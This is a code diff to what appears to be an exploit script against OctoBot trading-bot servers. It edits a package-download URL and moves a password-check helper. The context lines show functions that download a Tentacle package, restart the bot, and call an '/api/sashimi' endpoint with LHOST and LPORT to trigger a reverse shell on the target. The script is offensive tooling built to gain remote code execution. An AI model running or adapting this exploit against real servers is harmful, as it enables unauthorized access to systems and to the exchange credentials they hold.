@@ -43,14 +43,6 @@ def help():
   print('[-] \033[1;93mNote*\033[1;m If you are using a hostname instead of an IP address please remove http:// or https:// and try again.')
 
 
-def isPassword(RHOST, RPORT):
-  if RPORT == 443:
-    url = 'https://{}:{}'.format(RHOST, RPORT)
-  else:
-    url = 'http://{}:{}'.format(RHOST, RPORT)
-  return curl(url)
-
-
 def getOctobotVersion(RHOST, RPORT):
   if RPORT == 443:
     url = 'https://{}:{}/api/version'.format(RHOST, RPORT)
@@ -74,7 +66,7 @@ def restartOctobot(RHOST, RPORT):
 
 def downloadTentaclePackage(octobotVersion):
   print('[+] \033[1;92mStart downloading Tentacle package for OctoBot {}.\033[1;m'.format(octobotVersion))
-  url = 'https://tentacles.octobot.online/repository/tentacles/officials/packages/full/base/{}/any_platform.zip'.format(octobotVersion)
+  url = 'https://static.octobot.online/tentacles/officials/packages/full/base/{}/any_platform.zip'.format(octobotVersion)
   result = requests.get(url, stream=True)
   with open('{}.zip'.format(octobotVersion), 'wb') as fd:
     for chunk in result.iter_content(chunk_size=128):
@@ -177,6 +169,13 @@ def execReverseShell(RHOST, RPORT, LHOST, LPORT):
     url = 'http://{}:{}/api/sashimi?LHOST={}&LPORT={}'.format(RHOST, RPORT, LHOST, LPORT)
   return curl(url) 
 
+def isPassword(RHOST, RPORT):
+  if RPORT == 443:
+    url = 'https://{}:{}'.format(RHOST, RPORT)
+  else:
+    url = 'http://{}:{}'.format(RHOST, RPORT)
+  return curl(url)
+  
 def main():
   banner()
   args = parser.parse_args()
